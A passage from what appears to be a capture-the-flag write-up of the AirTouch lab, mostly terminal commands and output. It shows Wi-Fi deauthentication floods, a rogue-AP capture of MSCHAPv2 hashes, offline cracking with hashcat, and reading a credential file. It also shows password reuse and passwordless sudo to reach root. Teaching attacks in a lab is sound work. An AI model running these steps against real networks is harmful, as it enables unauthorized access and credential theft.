root@AirTouch-Consultant:~# aireplay-ng -0 10 -a AC:8B:A9:AA:3F:D2 wlan5; aireplay-ng -0 10 -a AC:8B:A9:F3:A1:13 wlan5
20:59:27  Waiting for beacon frame (BSSID: AC:8B:A9:AA:3F:D2) on channel 44
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
20:59:27  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:28  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:28  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:29  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:29  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:31  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:31  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:32  Waiting for beacon frame (BSSID: AC:8B:A9:F3:A1:13) on channel 44
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
20:59:32  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:32  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:33  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:33  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:34  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:34  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:35  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:35  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:36  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:36  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
```

While that’s running, I get authentication at `eaphammer`:

```console
Press enter to quit...

wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: associated (aid 1)
wlan4: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:f3
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

mschapv2: Sun Apr 12 20:59:32 2026
         domain\username:               AirTouch\r4ulcl
         username:                      r4ulcl
         challenge:                     a2:3d:68:e5:dc:dc:cb:a1
         response:                      34:ee:c9:f8:ba:ce:de:bb:c8:2e:e2:b8:73:d5:96:df:de:89:20:a5:c7:3d:9f:ed

         jtr NETNTLM:                   r4ulcl:$NETNTLM$a23d68e5dcdccba1$34eec9f8bacedebbc82ee2b873d596dfde8920a5c73d9fed

         hashcat NETNTLM:               r4ulcl::::34eec9f8bacedebbc82ee2b873d596dfde8920a5c73d9fed:a23d68e5dcdccba1

wlan4: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:f3
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: deauthenticated due to local deauth request
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: associated (aid 1)
wlan4: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:f3
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

mschapv2: Sun Apr 12 20:59:45 2026
         domain\username:               AirTouch\r4ulcl
         username:                      r4ulcl
         challenge:                     18:0b:04:4b:d3:9a:62:ec
         response:                      a1:c8:30:70:07:69:a6:67:fc:2b:24:c1:61:43:0d:90:2e:e9:e1:92:a6:83:d0:6f

         jtr NETNTLM:                   r4ulcl:$NETNTLM$180b044bd39a62ec$a1c830700769a667fc2b24c161430d902ee9e192a683d06f

         hashcat NETNTLM:               r4ulcl::::a1c830700769a667fc2b24c161430d902ee9e192a683d06f:180b044bd39a62ec

wlan4: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:f3
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: deauthenticated due to local deauth request
```

#### Crack Challenge Response

The MSCHAPv2 challenge/response in a PEAP-MSCHAPv2 exchange is mathematically identical to a NetNTLMv1 challenge/response, so the captured material can be cracked offline as a NetNTLMv1 hash. I’ll save the “hashcat NETNTLM” output to a file and pass it to `hashcat`:

```console
$ hashcat ./AirTouch-Office.hash rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
...[snip]...
r4ulcl::::a1c830700769a667fc2b24c161430d902ee9e192a683d06f:180b044bd39a62ec:laboratory
...[snip]...
```

It identifies the hash format and cracks it from `rockyou.txt` in less than 10 seconds on my computer.

### Connect to AirTouch-Office

I’ll create a `airtouch-office.conf` file:

```python
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}
```

Now use `wpa_supplicant` to connect:

```console
root@AirTouch-Consultant:~# wpa_supplicant -i wlan6 -c ./airtouch-office.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan6' UP
nl80211: deinit ifname=p2p-dev-wlan6 disabled_11b_rates=0
p2p-dev-wlan6: Failed to initialize driver interface
P2P: Failed to enable P2P Device interface
wlan6: SME: Trying to authenticate with ac:8b:a9:aa:3f:d2 (SSID='AirTouch-Office' freq=5220 MHz)
wlan6: Trying to associate with ac:8b:a9:aa:3f:d2 (SSID='AirTouch-Office' freq=5220 MHz)
wlan6: Associated with ac:8b:a9:aa:3f:d2
wlan6: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan6: CTRL-EVENT-EAP-STARTED EAP authentication started
wlan6: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan6: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 25 (PEAP) selected
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=1 subject='/C=ES/ST=Madrid/L=Madrid/O=AirTouch/OU=Certificate Authority/CN=AirTouch CA/emailAddress=ca@AirTouch.htb' hash=222a7dd4d28c97c8e4730762fa9a102af05c7d56b35279b2f5ee4da7ddf918a8
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=ES/L=Madrid/O=AirTouch/OU=Server/CN=AirTouch CA/emailAddress=server@AirTouch.htb' hash=ef39f3fff0883db7fc8a535c52f80509fc395e9889061e209102307b46995864
EAP-MSCHAPV2: Authentication succeeded
wlan6: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan6: PMKSA-CACHE-ADDED ac:8b:a9:aa:3f:d2 0
wlan6: WPA: Key negotiation completed with ac:8b:a9:aa:3f:d2 [PTK=CCMP GTK=CCMP]
wlan6: CTRL-EVENT-CONNECTED - Connection to ac:8b:a9:aa:3f:d2 completed [id=0 id_str=]
```

This just hangs, but I can ctrl-z then `bg` to let it run in the background or use another terminal. `iw` can verify it’s connected:

```console
root@AirTouch-Consultant:~# iw dev wlan6 link
Connected to ac:8b:a9:aa:3f:d2 (on wlan6)
        SSID: AirTouch-Office
        freq: 5220
        RX: 118531 bytes (1613 packets)
        TX: 1885 bytes (38 packets)
        signal: -30 dBm
        rx bitrate: 6.0 MBit/s
        tx bitrate: 54.0 MBit/s

        bss flags:      short-slot-time
        dtim period:    2
        beacon int:     100
```

`dhclient` will get an IP:

```console
root@AirTouch-Consultant:~# dhclient -v wlan6
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan6/02:00:00:00:06:00
Sending on   LPF/wlan6/02:00:00:00:06:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan6 to 255.255.255.255 port 67 interval 3 (xid=0x8eafc62c)
DHCPDISCOVER on wlan6 to 255.255.255.255 port 67 interval 7 (xid=0x8eafc62c)
DHCPOFFER of 10.10.10.38 from 10.10.10.1
DHCPREQUEST for 10.10.10.38 on wlan6 to 255.255.255.255 port 67 (xid=0x2cc6af8e)
DHCPACK of 10.10.10.38 from 10.10.10.1 (xid=0x8eafc62c)
bound to 10.10.10.38 -- renewal in 429204 seconds.
root@AirTouch-Consultant:~# ip addr show wlan6
13: wlan6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.38/24 brd 10.10.10.255 scope global dynamic wlan6
       valid_lft 863006sec preferred_lft 863006sec
    inet6 fe80::ff:fe00:600/64 scope link
       valid_lft forever preferred_lft forever
```

### SSH

I’ll use the creds collected earlier to connect over SSH (either from AirTouch-Consultant or over `proxychains`):

```console
oxdf@hacky$ proxychains sshpass -p xGgWEwqUpfoOVsLeROeG ssh remote@10.10.10.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.1:22  ...  OK
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
remote@AirTouch-AP-MGT:~$
```

## Shell as root@AirTouch-AP-MGT

### Enumeration

#### Users

The remote user’s home directory is very empty:

```console
remote@AirTouch-AP-MGT:~$ ls -la
total 36
drwxr-xr-x 1 remote remote 4096 Apr 13 01:32 .
drwxr-xr-x 1 root   root   4096 Jan 13 14:55 ..
-rw-rw-r-- 1 remote remote    1 Nov 24  2024 .bash_history
-rw-r--r-- 1 remote remote  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 remote remote 3771 Feb 25  2020 .bashrc
drwx------ 2 remote remote 4096 Apr 13 01:32 .cache
-rw-r--r-- 1 remote remote  807 Feb 25  2020 .profile
```

There’s one additional user with a home directory in `/home`:

```console
remote@AirTouch-AP-MGT:/home$ ls
admin  remote
```

This is consistent with the users with shells set in `passwd`:

```console
remote@AirTouch-AP-MGT:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
remote:x:1000:1000::/home/remote:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```

remote can access `/home/admin`, and it’s empty as well:

```console
remote@AirTouch-AP-MGT:/home/admin$ ls -la
total 28
drwxr-xr-x 1 admin admin 4096 Jan 13 14:55 .
drwxr-xr-x 1 root  root  4096 Jan 13 14:55 ..
-rw-rw-r-- 1 admin admin    1 Nov 24  2024 .bash_history
-rw-r--r-- 1 admin admin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 admin admin 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 admin admin  807 Feb 25  2020 .profile
```

remote cannot run `sudo` on AirTouch-AP-MGT:

```console
remote@AirTouch-AP-MGT:/home/admin$ sudo -l
[sudo] password for remote:
Sorry, user remote may not run sudo on AirTouch-AP-MGT.
```

#### Processes

The only listening services are SSH and DNS:

```console
remote@AirTouch-AP-MGT:/$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp6       0      0 :::53                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```

The process list is very short (likely because we’re in a Docker container):

```console
remote@AirTouch-AP-MGT:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2608   596 ?        Ss   Apr10   0:00 /bin/sh -c service ssh start && tail -f /dev/null
root          15  0.0  0.1  12188  4180 ?        Ss   Apr10   0:35 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          16  0.0  0.0   2544   512 ?        S    Apr10   0:23 tail -f /dev/null
root          28  0.0  0.0   3976  3076 ?        Ss   Apr10   0:00 bash /root/start.sh
root          45  0.1  0.1  10624  7972 ?        S    Apr10   5:27 hostapd_aps /root/mgt/hostapd_wpe.conf
root          46  0.1  0.1  10640  8024 ?        S    Apr10   5:37 hostapd_aps /root/mgt/hostapd_wpe2.conf
root          63  0.0  0.0   9300  3788 ?        S    Apr10   0:00 dnsmasq -d
root      624537  0.0  0.2  13912  8972 ?        Ss   01:32   0:00 sshd: remote [priv]
remote    624548  0.0  0.1  13912  5312 ?        S    01:32   0:00 sshd: remote@pts/0
remote    624549  0.0  0.1   5992  4024 pts/0    Ss   01:32   0:00 -bash
remote    732988  0.0  0.0   7644  3200 pts/0    R+   11:00   0:00 ps auxww
```

`dnsmasq`, an open-source [DNS Server](https://en.wikipedia.org/wiki/Dnsmasq), explains why the host is listening on port 53.

#### hostapd

`hostapd_aps` is also running with two different config files. `hostapd` [defines itself](https://w1.fi/hostapd/) as:

> hostapd is a user space daemon for access point and authentication servers. It implements IEEE 802.11 access point management, IEEE 802.1X/WPA/WPA2/WPA3/EAP Authenticators, RADIUS client, EAP server, and RADIUS authentication server. The current version supports Linux (Host AP, madwifi, mac80211-based drivers) and FreeBSD (net80211).

`hostapd_aps` is not a well known binary name. Running it with `-v` shows the standard `hostapd` banner:

```console
remote@AirTouch-AP-MGT:/$ hostapd_aps -v
hostapd v2.9
User space daemon for IEEE 802.11 AP management,
IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
Copyright (c) 2002-2019, Jouni Malinen <j@w1.fi> and contributors
```

There could still be changes in the code, but it’s at least based on or trying to look like `hostapd`.

I can’t access either of the running config files as they are in `/root`. There are config files in `/etc/hostapd`:

```console
remote@AirTouch-AP-MGT:/$ ls /etc/hostapd/
hostapd_wpe.conf.tmp  hostapd_wpe.eap_user  hostapd_wpe2.conf.tmp  ifupdown.sh
```

`hostapd_wpe.eap_user` is where the credentials for the various users are stored:

```console
remote@AirTouch-AP-MGT:/etc/hostapd$ cat hostapd_wpe.eap_user | grep -v '^#' | grep .
*               PEAP,TTLS,TLS,FAST
*       PEAP,TTLS,TLS,FAST [ver=1]
"AirTouch\r4ulcl"                           MSCHAPV2            "laboratory" [2]
"admin"                                 MSCHAPV2                "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

Here is where r4ulcl has their password set to “laboratory”. There’s also a password for admin.

### Escalation

#### Shell as admin

The password works for the admin user’s local account as well:

```console
remote@AirTouch-AP-MGT:/etc/hostapd$ su - admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@AirTouch-AP-MGT:~$
```

I can also SSH:

```console
oxdf@hacky$ proxychains sshpass -p xMJpzXt4D9ouMuL3JJsMriF7KZozm7 ssh admin@10.10.10.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.1:22  ...  OK
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@AirTouch-AP-MGT:~$
```

#### sudo

Both with `su` and `ssh` there’s a message saying to use the `sudo` command to run commands as root. admin can run any command as any user without a password:

```console
admin@AirTouch-AP-MGT:~$ sudo -l
Matching Defaults entries for admin on AirTouch-AP-MGT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

I’ll use `sudo -i` to get a shell:

```console
admin@AirTouch-AP-MGT:~$ sudo -i
root@AirTouch-AP-MGT:~#
```

And read the flag:

```console
root@AirTouch-AP-MGT:~# cat root.txt
29d0508a************************
```
